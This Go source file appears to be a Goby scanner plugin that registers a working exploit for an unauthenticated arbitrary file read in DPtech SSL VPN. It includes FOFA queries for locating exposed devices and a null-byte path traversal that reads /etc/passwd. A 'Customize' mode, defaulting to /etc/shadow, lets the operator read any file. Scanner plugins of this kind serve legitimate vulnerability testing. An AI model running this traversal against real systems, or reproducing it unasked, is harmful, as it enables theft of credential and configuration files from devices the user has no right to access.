package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": " DPtech-SSLVPN / File Read Vulnerability",
    "Description": "<p>Hangzhou DPtech Technology Co., Ltd. is a high-tech enterprise integrating R&amp;D, production and sales in the fields of network, security and application delivery. </p><p>DPtech SSL VPN has an arbitrary file reading vulnerability, and an unauthenticated attacker can bypass the patch security verification mechanism through %00 to read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites</p>",
    "Product": "DPtech-SSLVPN",
    "Homepage": "https://www.dptech.com/",
    "DisclosureDate": "2024-10-08",
    "PostTime": "2024-10-11",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title==\"SSL VPN Service\" && header=\"Dptech\" || cert=\"DPtechCa\"",
    "GobyQuery": "title==\"SSL VPN Service\" && header=\"Dptech\" || cert=\"DPtechCa\"",
    "Level": "1",
    "Impact": "<p>DPtech SSL VPN has an arbitrary file reading vulnerability, and an unauthenticated attacker can bypass the patch security verification mechanism through %00 to read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.dptech.com/\">http://www.dptech.com/</a></p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/142101669"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/shadow",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": " DPtech-SSLVPN / 文件读取漏洞",
            "Product": "DPtech-SSLVPN",
            "Description": "<p>杭州迪普科技股份有限公司是在网络、安全及应用交付领域集研发、生产、销售于一体的高科技企业。</p><p>迪普SSL VPN 存在任意文件读取漏洞，未经身份验证攻击者可通过%00绕过补丁安全校验机制，读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>厂商已提供漏洞修补方案，请关注厂商主页及时更新：<a href=\"http://www.dptech.com/\">http://www.dptech.com/</a><br></p>",
            "Impact": "<p>迪普SSL VPN 存在任意文件读取漏洞，未经身份验证攻击者可通过%00绕过补丁安全校验机制，读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": " DPtech-SSLVPN / File Read Vulnerability",
            "Product": "DPtech-SSLVPN",
            "Description": "<p>Hangzhou DPtech Technology Co., Ltd. is a high-tech enterprise integrating R&amp;D, production and sales in the fields of network, security and application delivery.&nbsp;</p><p>DPtech SSL VPN has an arbitrary file reading vulnerability, and an unauthenticated attacker can bypass the patch security verification mechanism through %00 to read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.dptech.com/\">http://www.dptech.com/</a><br></p>",
            "Impact": "<p>DPtech SSL VPN has an arbitrary file reading vulnerability, and an unauthenticated attacker can bypass the patch security verification mechanism through %00 to read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9959"
}`
	postOrGet_andaudbniuqwdh1837f1bygfv1y7fd := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		//替换fileUrl中的/为%2F
		fileUrl = strings.Replace(fileUrl, "/", "%2F", -1)
		requestConfig := httpclient.NewGetRequestConfig("/.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00." + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 200 {
				respTxt = resp.RawBody
				return respTxt, nil
			}
		}
		// 错误输出
		err := errors.New("fail to read")
		return respTxt, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root:",
			}
			// 函数继承
			uploadFileFunc := postOrGet_andaudbniuqwdh1837f1bygfv1y7fd

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root:"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_andaudbniuqwdh1837f1bygfv1y7fd

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
